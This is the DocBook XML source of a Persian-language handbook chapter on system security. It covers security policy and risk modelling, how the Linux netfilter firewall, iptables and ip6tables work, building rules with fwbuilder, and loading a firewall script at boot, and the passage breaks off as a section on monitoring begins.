<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>فایروال</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>امنیت</title>
  <highlights>
    <para>یک سیستم اطلاعاتی با توجه به محیط خود می‌تواند سطوح مختلفی از اهمیت را دارا باشد. در برخی موارد، این شرایط برای بقای شرکت حیاتی است. بنابراین باید نسبت به انواع مختلف خطر محافظت گردد. فرآیندی که برای ارزیابی این خطرات، تعریف و پیاده‌سازی لایه حفاظتی انجام می‌شود “فرآیند امنیت” نام دارد.</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>تعریف خط‌مشی امنیتی</title>

    <sidebar>
      <title><emphasis>احتیاط</emphasis> حوزه این فصل</title>

      <para>امنیت یک موضوع بزرگ و بسیار حساس است، پس نمی‌توان ادعا کرد که تمام موارد مربوط به آن را طی یک فصل به صورت بیان نمود. ما تنها به ترسیم برخی نقاط مهم و معرفی چند ابزار و روش مشخص در حوزه امنیت می‌پردازیم. برای مطاعه بیشتر، کتاب‌های کاملی در این حوزه نگارش شده‌اند. یک نقطه آغاز مناسب کتاب <citetitle>امنیت سرور لینوکس</citetitle> نوشته مایکل باور (انتشارات O'Reilly) است.</para>
    </sidebar>

    <para>واژه “امنیت” خود مفاهیم، ابزارها و فرآیندهای گسترده‌ای را شامل می‌شود که هیچکدام به صورت کامل معنای آن را نمی‌رسانند. انتخاب از میان ‌آن‌ها مستلزم ایده‌ای دقیق راجع به اهداف مورد نظر شماست. ایمن‌سازی یک سیستم با پاسخ به چند پرسش اولیه آغاز می‌شود. اینکه از ابتدا با پیاده‌سازی عجله‌ای چند ابزار تمرکز خود را روی یک حوزه معطوف کنیم، ما را در جنبه‌های اشتباه از امنیت قرار می‌دهد.</para>

    <para>یکی از اولین کارهایی که باید انجام داد تشخیص هدف است. رویکرد خوبی که می‌تواند در این تشخیص به ما یاری رساند با پرسش‌های زیر آغاز می‌شود:</para>
    <itemizedlist>
      <listitem>
	<para>از <emphasis>چه چیزی</emphasis> می‌خواهیم محافظت کنیم؟ خط‌مشی امنیت نسبت به اینکه قصد محافظت از رایانه یا داده را داریم متفاوت خواهد بود. در مورد دوم، همچنین باید بدانیم از کدام نوع داده می‌خواهیم محافظت کنیم.</para>
      </listitem>
      <listitem>
	<para>از روی دادن <emphasis>چه اتفاقی</emphasis> می‌خواهیم پیشگیری کنیم؟ آیا اطلاعات محرمانه نشت یافته است؟ داده‌ها به صورت تصادفی از بین رفته‌اند؟ سود تجاری با مختل شدن سرویس از بین رفته است؟</para>
      </listitem>
      <listitem>
	<para>همچنین، قصد محافظت مقابل <emphasis>چه کسانی</emphasis> را داریم؟ معیارهای امنیتی برای مقابله با اشتباه یک کاربر عادی در مقایسه با یک گروه مهاجم بسیار متفاوت خواهد بود.</para>
      </listitem>
    </itemizedlist>

    <para>عبارت “خطر” به طور معمول در مورد این سه عامل ارجاع داده می‌شود: از چه چیز محافظت شود، از روی دادن چه اتفاقی می‌خواهیم پیشگیری کنیم و قصد محافظت مقابل چه کسانی را داریم. مدل‌سازی خطر نیازمند پاسخ به این سه پرسش است. از این مدل خطر، یک خط‌مشی امنیتی می‌تواند ایجاد گردد که این خط‌مشی می‌تواند با اقدامات مستحکم پیاده‌سازی شود.</para>

    <sidebar>
      <title><emphasis>یادداشت</emphasis> پرسش‌گری به صورت مداوم</title>

      <para>بروس شنیر، یک متخصص جهانی در حوزه امنیت (نه تنها امنیت رایانه) تلاش دارد تا با یکی از افسانه‌های امنیت با این شعار مقابله کند: “امنیت یک فرآیند است، نه یک محصول”. دارایی‌هایی که قصد محافظت از آن‌ها را داریم در گذر زمان تغییر می‌کنند، به همین ترتیب تهدیدات و ابزارهایی که برای مهاجمین احتمالی موجود هستند. حتی اگر یک خط‌مشی امنیتی از ابتدا به صورت کامل طراحی و پیاده‌سازی شده باشد، نباید به کارایی آن در آینده اعتماد کرد. عامل خطر پیشرفت می‌کند، پس پاسخ مناسب به این عامل نیز باید پیشرفت داشته باشد.</para>
    </sidebar>

    <para>محدودیت‌های اضافی نیز در این مورد باید به حساب آیند، چرا که می‌توانند محدوده خط‌مشی موجود را کوچک سازند. برای ایمن‌سازی یک سیستم تا کجا پیش خواهیم رفت؟ این پرسش تاثیر اساسی روی خط‌مشی قابل پیاده‌سازی می‌گذارد. پاسخ در اغلب موارد به صورت هزینه‌های مالی تعریف می‌شود، اما سایر عناصر نیز باید در آن گنجانده شوند، از جمله میزان ناراحتی که بر کاربران سیستم تحمیل می‌شود یا کاهش عملکرد کلی.</para>

    <para>زمانی که مدل‌سازی خطر صورت گرفت، می‌توان راجع به طراحی یک خط‌مشی امنیتی حقیقی فکر کرد.</para>

    <sidebar>
      <title><emphasis>یادداشت</emphasis> خط‌مشی‌های مفرط</title>

      <para>مواردی وجود دارد که در آن‌ها انتخاب اقدامات لازم برای ایمن‌سازی سیستم بسیار ساده است.</para>

      <para>برای نمونه، اگر سیستمی که قصد محافظت از آن را داریم تنها شامل یک رایانه دست-دوم باشد، که کاربرد آن افزودن چند عدد در انتهای روز است، تصمیم بر اینکه کار خاصی درباره محافظت از آن انجام ندهیم بسیار عاقلانه است. ارزش ذاتی این سیستم پایین است. ارزش داده نیز صفر است چرا که در این رایانه ذخیره‌سازی نمی‌شود. یک مهاجم احتمالی که به این “سیستم” نفوذ کند تنها با یک ماشین حساب بزرگ مواجه خواهد شد. هزینه ایمن‌سازی چنین سیستمی در مقایسه با هزینه نفوذ به آن بیشتر خواهد بود.</para>

      <para>از طرف دیگر، شاید بخواهیم از محرمانگی داده‌های حساس به جامع‌ترین روش ممکن محافظت کنیم. در این مورد، یک پاسخ مناسب می‌تواند از بین بردن تمام این داده‌ها باشد (حذف فایل‌ها به شیوه‌ای ایمن، پاکسازی هارد دیسک‌ها در سطح بیت، قرار دادن آن‌ها در اسید و از این قبیل). اگر نیازمندی دیگری در رابطه با ذخیره‌سازی داده برای نیاز آینده (با اینکه الزامی در موجود بودن آن نیست) باشد و اگر هزینه هنوز عامل مهمی نیست، پس نقطه شروع می‌تواند ذخیره‌سازی این داده‌ها روی نوارهای ایریدیوم-پلاتینیوم محافظت شده در سنگرهای ضد-بمب موجود در چندین کوهستان جهان است، که هر کدام (البته) کاملا محرمانه بوده و توسط ارتش‌های جداگانه محافظت می‌شوند...</para>

      <para>با اینکه این مثال‌ها مفرط (ساده یا شدید) بنظر می‌آیند، هیچگاه پاسخ مناسبی به خطرات تعریف شده نمی‌باشند، تا به حال که خروجی یک فرآیند فکری در به حساب آوردن اهداف مورد نظر و محدودیت‌های قابل پوشش بوده‌اند. زمانی که از یک تصمیم منطقی باز می‌گردیم، هیچ خط‌مشی امنیتی نسبت به دیگری برتری ندارد.</para>
    </sidebar>

    <para>در اکثر موارد، سیستم اطلاعاتی می‌تواند به زیر مجموعه‌های یکپارچه و اغلب مستقل تقسیم شود. هر زیر مجموعه نیازمندی‌ها و محدودیت‌های خود را خواهد داشت که ارزیابی خطر و طراحی خط‌مشی سیاسی به صورت جداگانه برای هر کدام باید محاسبه گردد. یک قاعده خود که باید مد نظر قرار دهیم این است که درک یک محیط کوچک و خوش-تعریف نسبت به یک جنگل بزرگ و طولانی آسان‌تر است. سازماندهی شبکه نیز باید به همین صورت طراحی گردد: خدمات حساس باید روی تعداد کمی از ماشین‌ها قرار داشته باشند و این ماشین‌ها تنها باید از حداقل تعداد نقاط ممکن قابل دسترس باشند؛ ایمن‌سازی این نقاط نسبت به ایمن‌سازی تمام ماشین‌های حساس در مقابل دنیای خارج راحت‌تر است. در این نقطه است که کاربردپذیری فیلترینگ شبکه (که شامل فایروال‌ها می‌شود) مشخص می‌شود. این فیلترینگ می‌تواند با استفاده از یک سخت‌افزار اختصاصی انجام شود، اما یک راهکار ساده‌تر و موثرتر استفاده از نرم‌افزار فایروال از جمله نسخه ادغام شده در کرنل لینوکس است.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>فایروال یا فیلترینگ بسته</title>
    <indexterm><primary>فایروال</primary></indexterm>
    <indexterm><primary>فیلتر بسته</primary></indexterm>

    <sidebar>
      <title><emphasis>بازگشت به مقدمات</emphasis> فایروال</title>
      <indexterm><primary>بسته</primary><secondary>IP</secondary></indexterm>

      <para>یک <emphasis>فایروال</emphasis> تجهیزات رایانه‌ای به صورت سخت‌افزار یا نرم‌افزار است که بسته‌های دریافتی یا ارسالی شبکه (از و یا به شبکه محلی) را مرتب‌سازی کرده و تنها به ماشین‌هایی اجازه دسترسی می‌دهد که شرایط از پیش تعریف شده را داشته باشند.</para>
    </sidebar>

    <para>فایروال یک دروازه فیلترینگ شبکه است که تنها برای بسته‌های ارسالی از میان آن کاربرد دارد. بنابراین، در صورتی که عبور از فایروال تنها مسیر موجود برای این بسته‌ها باشد موثر خواهد بود.</para>

    <para>نبود یک پیکربندی استاندارد (و شعار “فرآیند، نه محصول”) نبود یک راهکار جامع را توضیح می‌دهد. اگرچه، ابزارهایی وجود دارند که پیکربندی فایروال <emphasis>netfilter</emphasis> با یک نمایش گرافیکی از قوانین فیلترینگ ساده می‌کنند. <command>fwbuilder</command> بدون شک یکی از بهترین آن‌ها است.</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>مورد ویژه</emphasis> فایروال محلی</title>

      <para>یک فایروال می‌تواند به یک ماشین بخصوص محدود شود (در مقایسه با یک شبکه کامل)، که در این صورت نقش آن فیلتر یا محدودکردن دسترسی به برخی سرویس‌ها است، یا احتمالا پیشگیری از برقراری ارتباط توسط نرم‌افزارهایی که ممکن است یک کاربر، آگاهانه یا بدون اطلاع، نصب کرده باشد.</para>
    </sidebar>

    <para>کرنل لینوکس شامل فایروال <emphasis>netfilter</emphasis> می‌باشد. این نرم‌افزار می‌تواند از فضای کاربری توسط دستورات <command>iptables</command> و <command>ip6tables</command> کنترل شود. تفاوت این دو دستور در نحوه عملکرد آن‌ها روی شبکه‌های IPv4 و IPv6 است. از آنجا که این دو پروتکل شبکه برای سالیان طولانی کار خواهند کرد، نیاز است که از هر دو ابزار به صورت موازی استفاده کنیم.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>عملکرد Netfilter</title>

      <para><emphasis>netfilter</emphasis> از چهار جدول متمایز برای ذخیره‌سازی قوانین مرتبط با سه نوع عملیات روی بسته‌ها استفاده می‌کند:</para>
      <itemizedlist>
        <listitem>
	  <para>... برای قوانین فیلترینگ بکار می‌رود (دریافت، امتناع یا رد یک بسته)؛</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> برای ترجمه نشانی‌های مبدا، مقصد و درگاه‌های مرتبط با بسته بکار می‌رود؛</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> برای سایر تغییرات اعمال شده در بسته‌های IP بکار می‌رود (از جمله فیلد <emphasis>Type of Service</emphasis> و گزینه‌های دیگر)؛</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> امکان سایر تغییرات دستی روی بسته‌ها قبل از اینکه به سیستم رهگیری ارتباط برسند را فراهم می‌کند.</para>
        </listitem>
      </itemizedlist>

      <para>هر جدول شامل فهرستی از قوانین بنام <emphasis>زنجیره</emphasis> است. فایروال با استفاده از زنجیره‌های استاندارد بسته‌هایی را که در شرایط خاصی قرار می‌گیرند مدیریت می‌کند. مدیر سیستم می‌تواند زنجیره‌های دیگری را ایجاد کند، که تنها در صورت ارجاع از یک زنجیره استاندارد (به صورت مستقیم یا غیرمستقیم) مورد استفاده قرار می‌گیرند.</para>
      <indexterm><primary>زنجیر</primary></indexterm>
      <indexterm><primary>قانون فیلترینگ</primary></indexterm>

      <para>جدول <literal>filter</literal> دارای سه زنجیره استاندارد است:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>: به بسته‌هایی مربوط می‌شود که مقصدشان خود فایروال باشد؛</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: به بسته‌های ارسال شده از طرف فایروال مربوط می‌شود؛</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>: به بسته‌هایی مربوط می‌شود که از میان فایروال می‌گذرند (بسته‌هایی که مبدا یا مقصد فایروال نباشند).</para>
        </listitem>
      </itemizedlist>

      <para>جدول <literal>nat</literal> نیز دارای سه زنجیره استاندارد است:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>: برای تغییر بسته‌ها به محض رسیدن به فایروال؛</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>: برای تغییر بسته‌ها زمانی که آماده ارسال از فایروال باشند؛</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: برای تغییر بسته‌هایی که از خود فایروال تولید شده‌اند.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>چگونگی نامگذاری زنجیره‌های <emphasis>netfilter</emphasis></title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>هر زنجیره فهرستی از قوانین است؛ هر قانون مجموعه‌ای از شرایط و اقدامات لازم در صورت برآورده شدن شرط مربوطه است. هنگام پردازش یک بسته، فایروال اقدام به پویش زنجیره مرتبط با آن می‌کند که هر قانون پس از دیگری فراخوانده می‌شود؛ زمانی که شرایط یک قانون برآورده شود، فرآیند به اقدام مربوط به آن “پرش” (گزینه <literal>-j</literal> در دستورات) کرده تا پردازش ادامه یابد. متداول‌ترین عملکردها به صورت استاندارد هستند که اقدامات اختصاصی مربوط به خود را دارا هستند. استفاده یکی از این اقدامات استاندارد منجر به مختل شدن پردازش زنجیره می‌شود، چرا که سرنوشت بسته از این لحظه رقم خورده است (بجز استثنایی که در ادامه می‌آید):</para>

      <sidebar>
        <title><emphasis>بازگشت به مقدمات</emphasis> ICMP</title>

	<para>ICMP یا <emphasis>Internet Control Message Protocol</emphasis> پروتکلی است که برای انتقال اطلاعات مکمل ارتباطی استفاده می‌شود. این پروتکل امکان آزمون برقراری شبکه را با استفاده از دستور <command>ping</command> صادر می‌کند (که در آن یک پیام <emphasis>ICMP Echo Request</emphasis> فرستاده می‌شود و گیرنده باید با یک پیام <emphasis>ICMP Echo Reply</emphasis> پاسخ دهد). هنگام رد بسته توسط فایروال، که overflow در حافظه دریافتی را شامل می‌شود، یک مسیر بهتر برای بسته‌های بعدی هنگام ارتباط پیشنهاد می‌کند. این پروتکل توسط چندین سند RFC تعریف شده است؛ اسناد اولیه RFC777 و RFC792 کامل شده و توسعه یافته‌اند. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>برای اشاره، بافر دریافتی یک حافظه کوچک برای ذخیره‌سازی داده است که از زمان رسیدن به شبکه تا پردازش توسط کرنل استفاده می‌شود. اگر این منطقه پر باشد، داده جدید نمی‌تواند دریافت شود و ICMP مشکل را مشخص می‌کند تا فرستنده‌ها سرعت انتقال داده را کاهش دهند (که پس از گذشت زمان به نرخ متعادل خود می‌رسد).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>بافر دریافتی</primary></indexterm>
        <indexterm><primary>بافر</primary><secondary>بافر دریافتی</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>به یاد داشته باشید اگرچه یک شبکه IPv4 می‌تواند بدون ICMP کار کند، استفاده از ICMP6 برای یک شبکه IPv6 بشدت مورد نیاز است، چرا که چندین قابلیت که در دنیای IPv4 بوده‌اند را با یکدیگر ترکیب می‌کند، از جمله IGMP یا <emphasis>Address Resolution Protocol</emphasis> و ARP یا <emphasis>Address Resolution Protocol</emphasis>. پروتکل ICMP6 در RFC4443 تعریف شده است. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: اجازه ادامه مسیر به بسته را می‌دهد؛</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>: بسته را همراه با یک خطای ICMP رد می‌کند (گزینه <literal>--reject-with <replaceable>type</replaceable></literal> برای <command>iptables</command> امکان انتخاب نوع خطا را فراهم می‌کند)؛</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: منجر به حذف (نادیده گرفتن) بسته می‌شود؛</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: همراه با یک پیام و توضیحات بسته و استفاده از <command>syslogd</command> آن را گزارش می‌کند؛ به یاد داشته باشید که این اقدام پردازش را مختل نمی‌کند و اجرای زنجیره ادامه می‌یابد، به همین دلیل است که عملیات گزارش از بسته‌های شامل قانون LOG و REJECT/DROP امتناع می‌کند؛</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: یک پیام را با استفاده از <command>ulogd</command> گزارش می‌کند، که برای مدیریت تعداد بالای پیام نسبت به <command>syslogd</command> عملکرد بهتری دارد؛ به یاد داشته باشید که این اقدام نیز مانند LOG پردازش را به قانون بعدی موجود در زنجیره می‌سپارد؛</para>
        </listitem>
        <listitem>
	  <para><replaceable>chain_name</replaceable>: به زنجیره اشاره شده پرش کرده و قوانین آن را ارزیابی می‌کند؛</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: پردازش زنجیره فعلی را متوقف کرده و به زنجیره فراخوان باز می‌گردد؛ در حالتی که زنجیره فعلی از نوع استاندارد باشد، فراخوان دیگری وجود ندارد بنابراین اقدام پیشفرض (که با گزینه <literal>-P</literal> در <command>iptables</command> مشخص می‌شود) بجای آن اجرا می‌شود؛</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (فقط در جدول <literal>nat</literal>): <emphasis>Source NAT</emphasis> را اعمال می‌کند (گزینه‌های اضافی که تغییرات مورد نظر را شامل می‌شوند)؛</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (فقط در جدول <literal>nat</literal>): <emphasis>Destination NAT</emphasis> را اعمال می‌کند (گزینه‌های اضافی که تغییرات مورد نظر را شامل می‌شوند)؛</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (فقط در جدول <literal>nat</literal>): <emphasis>masquerading</emphasis> را اعمال می‌کند (یک مورد بخصوص از <emphasis>Source NAT</emphasis>)؛</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (فقط در جدول <literal>nat</literal>): یک بسته را به درگاه داده شده از خود فایروال هدایت می کند؛ از این گزینه می‌توان برای راه‌اندازی یک پروکسی وب بدون هیچ پیکربندی در سمت برنامه کاربردی استفاده کرد، چرا که برنامه فکر می‌کند به صورت مستقیم به گیرنده متصل شده در حالی که از طریق پروکسی این ارتباط برقرار شده است.</para>
        </listitem>
      </itemizedlist>

      <para>سایر اقدامات، بخصوص آن‌هایی که مرتبط با جدول <literal>mangle</literal> هستند، خارج از محدوده این متن می‌باشند. صفحات راهنمای <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> و <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> فهرستی از این اقدامات را شامل می‌شوند.</para>
    </section>
    <section id="sect.iptables">
      <title>شیوه نگارش <command>iptables</command> و <command>ip6tables</command></title>

      <para>دستورات <command>iptables</command> و <command>ip6tables</command> امکان تغییر جدول‌ها، زنجیره‌ها و قوانین را فراهم می‌سازند. گزینه <literal>-t <replaceable>table</replaceable></literal> مشخص می‌کند که عملیات روی کدام جدول انجام شود (به صورت پیشفرض، <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>دستورات</title>

	<para>گزینه <literal>-N <replaceable>chain</replaceable></literal> یک زنجیره جدید ایجاد می‌کند.
گزینه <literal>-X <replaceable>chain</replaceable></literal> یک زنجیره خالی و بدون استفاده را حذف می‌کند.
گزینه <literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> یک قانون به انتهای زنجیره اشاره شده اضافه می‌کند.
گزینه <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> یک قانون قبل از قانون شماره <replaceable>rule_num</replaceable> درج می‌کند.
گزینه <literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> یا <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> یک قانون را از زنجیره حذف می‌کند؛ عبارت اول قانون را بر اساس شماره، در حالی که عبارت دوم قانون را بر اساس محتوا شناسایی می‌کند.
گزینه <literal>-F <replaceable>chain</replaceable></literal> یک زنجیره را پاکسازی (حذف تمام قوانین) می‌کند؛ اگر زنجیره‌ای مشخص نشود، تمام قوانین موجود در جدول حذف می‌شوند.
گزینه <literal>-L <replaceable>chain</replaceable></literal> فهرستی از قوانین موجود در زنجیره را نمایش می‌دهد.
در نهایت، گزینه <literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> اقدام یا “خط مشی” پیشفرض برای یک زنجیره را مشخص می‌کند؛ به یاد داشته باشید که تنها زنجیره‌های استاندارد می‌توانند چنین خط مشی داشته باشند.</para>
      </section>
      <section id="sect.iptables-rules">
        <title>قوانین</title>
        <indexterm><primary>قانون فیلترینگ</primary></indexterm>

	<para>هر قانون به صورت <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal> بیان می‌شود. اگر از چندین شرایط در یک قانون استفاده شود، آنگاه معیار پیوستگی (<emphasis>and</emphasis> منطقی) شرایط خواهد بود، که به اندازه هر یک از شرایط می‌تواند محدودکننده باشد.</para>

	<para>شرط <literal>-p <replaceable>protocol</replaceable></literal> با فیلد پروتکل از بسته IP منطبق است. متداول‌ترین مقادیر آن عبارتند از <literal>tcp</literal>، <literal>udp</literal>، <literal>icmp</literal> و <literal>icmpv6</literal>. قرار دادن یک علامت تعجب قبل از شرط منجر به منفی شدن مفهوم آن می‌گردد، که به معنای “هر بسته‌ای با پروتکل مختلف بجز گزینه اشاره شده” خواهد بود. این مکانیزم منفی‌سازی مختص به گزینه ... نیست و می‌تواند در مورد سایر شرایط نیز بکار رود.</para>

	<para>شرط <literal>-s <replaceable>address</replaceable></literal> یا <literal>-s <replaceable>network/mask</replaceable></literal> با نشانی مبدا از بسته منطبق است. به همین ترتیب، شرط <literal>-d <replaceable>address</replaceable></literal> یا <literal>-d <replaceable>network/mask</replaceable></literal> با نشانی مقصد از بسته منطبق است.</para>

	<para>شرط <literal>-i <replaceable>interface</replaceable></literal> بسته‌هایی را انتخاب می‌کند که از رایط شبکه اشاره شده دریافت شوند. شرط <literal>-o <replaceable>interface</replaceable></literal> بسته‌هایی را انتخاب می‌کند که به رابط شبکه اشاره شده ارسال شوند.</para>

	<para>علاوه بر شرایط عمومی اشاره شده، شرایط بخصوصی نیز وجود دارند. برای نمونه، شرط <literal>-p tcp</literal> می‌تواند مکمل شرایط درگاه TCP باشد، با بندهایی نظیر <literal>--source-port <replaceable>port</replaceable></literal> و <literal>--destination-port <replaceable>port</replaceable></literal>.</para>

	<para>شرط <literal>--state <replaceable>state</replaceable></literal> با وضعیت یک بسته در یک ارتباط منطبق است (اینکار نیازمند ماژول کرنل <command>ipt_conntrack</command> برای رهگیری ارتباط است). حالت <literal>NEW</literal> بسته‌ای با ارتباط جدید را تعریف می‌کند؛ حالت <literal>ESTABLISHED</literal> منطبق با بسته‌هایی است که به یک ارتباط موجود متعلق باشند و حالت <literal>RELATED</literal> منطبق با بسته‌هایی است که از یک ارتباط موجود نشات می‌گیرند (که در مورد ارتباط‌های <literal>ftp-data</literal> در حالت “active” از پروتکل FTP کاربرد دارد).</para>

	<para>قسمت قبل به توضیح اقدامات موجود پرداخت، ولی نه گزینه‌های مربوط به آن. برای نمونه، اقدام <literal>LOG</literal> گزینه‌های زیر را شامل می‌شود:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal>، با مقدار پیشفرض <literal>warning</literal>، سطح شدت <command>syslog</command> را مشخص می‌کند؛</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> امکان مشخص کردن یک متن پیشوند برای تفاوت قائل شدن بین پیام‌های گزارش شده را فراهم می‌کند؛</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>، <literal>--log-tcp-options</literal> و <literal>--log-ip-options</literal> داده اضافی برای ادغام شدن درون پیام را مشخص می‌کند: به ترتیب، شماره ترتیبی TCP، گزینه‌های TCP و گزینه‌های IP.</para>
          </listitem>
        </itemizedlist>

	<para>اقدام <literal>DNAT</literal> گزینه <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> را به منظور نشانی IP جدید مقصد و/یا درگاه مشخص می‌کند. به طور مشابه، اقدام <literal>SNAT</literal> گزینه <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> را به منظور نشانی IP جدید مبدا و/یا درگاه مشخص می‌کند.</para>

	<para>اقدام <literal>REDIRECT</literal> (که تنها در صورت موجود بودن NAT استفاده می‌شود) گزینه <literal>--to-ports <replaceable>port(s)</replaceable></literal> را برای مشخص کردن درگاه یا محدوده درگاهی که بسته‌ها باید به آن هدایت شوند بکار می‌برد.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>ایجاد قوانین</title>

      <para>ایجاد هر قانون مستلزم فراخوانی یکی از دستورات <command>iptables</command> یا <command>ip6tables</command> است. نوشتن این دستورات به صورت دستی می‌تواند خسته کننده باشد، از این رو فراخوانی آن‌ها معمولا از طریق یک اسکریپت در زمان راه‌اندازی اولیه به صورت خودکار صورت می‌گیرد. این اسکریپت می‌تواند به صورت دستی نوشته شود اما ابزار جالب و پیشرفته‌تری برای اینکار وجود دارد که <command>fwbuilder</command> نامیده می‌شود.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>اصول آن ساده است. در گام اول، باید مشخص گردد از چه عناصری در ایجاد قوانین استفاده می‌شود:</para>
      <itemizedlist>
        <listitem>
	  <para>خود فایروال، همراه با رابط‌های شبکه‌اش؛</para>
        </listitem>
        <listitem>
	  <para>شبکه‌ها، همراه با محدوده‌های IP مشخص؛</para>
        </listitem>
        <listitem>
	  <para>سرورها؛</para>
        </listitem>
        <listitem>
	  <para>درگاه‌های متعلق به سرویس‌های موجود در سرورها.</para>
        </listitem>
      </itemizedlist>

      <para>سپس قوانین می‌توانند با عملیات ساده کشیدن و رهاکردن روی اشیاء موجود ایجاد گردند. چندین منوی زمینه‌ای می‌توانند شرایط را تغییر دهند (برای نمونه، منفی کردن یک شرط). در این مرحله است که اقدام مورد نظر باید انتخاب و پیکربندی شود.</para>

      <para>تا آنجا که به IPv6 مرتبط است، می‌توان دو مجموعه قانون مختلف برای IPv4 و IPv6 ایجاد کرد یا با ایجاد یکی از آن‌ها و استفاده از <command>fwbuilder</command> نسبت به ترجمه دیگری همراه با نشانی‌های منتسب به اشیاء اقدام کرد.</para>

      <figure id="figure.fwbuilder">
        <title>پنجره اصلی fwbuilder</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> می‌تواند برای تولید اسکریپتی استفاده شود که پیکربندی فایروال مبتنی بر قوانین تعریف شده را در خود داشته باشد. معماری ماژولار آن باعث می‌شود که توانایی ایجاد اسکریپت برای چندین سیستم مختلف وجود داشته باشد (<command>iptables</command> برای لینوکس، <command>ipf</command> برای FreeBSD و <command>pf</command> برای OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>اجرای قوانین در هر مرتبه راه‌اندازی</title>

      <para>در سایر موارد، روش توصیه شده ثبت اسکریپت پیکربندی در یک عبارت <literal>up</literal> از فایل <filename>/etc/network/interfaces</filename> است. در مثال زیر، اسکریپت <filename>/usr/local/etc/arrakis.fw</filename> ذخیره‌سازی شده است.</para>

      <example id="example.network-interfaces-firewall">
        <title>فایل <filename>interfaces</filename> که اسکریپت فایروال را فراخوانی می‌کند</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>تصور بر این است که از <emphasis role="pkg">ifupdown</emphasis> برای پیکربندی رابط‌های شبکه استفاده می‌کنید. اگر از ابزار دیگری برای اینکار بهره می‌برید (مانند <emphasis>NetworkManager</emphasis> یا <emphasis>systemd-networkd</emphasis>)، بهتر است به مستندات آن‌ها مراجعه کرده تا روش فراخوانی اسکریپت پس از بالا آمدن رابط را پیدا کنید.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>نظارت: پیشگیری، شناسایی، بازدارندگی</title>
    <indexterm><primary>مانیتورینگ</primary></indexterm>

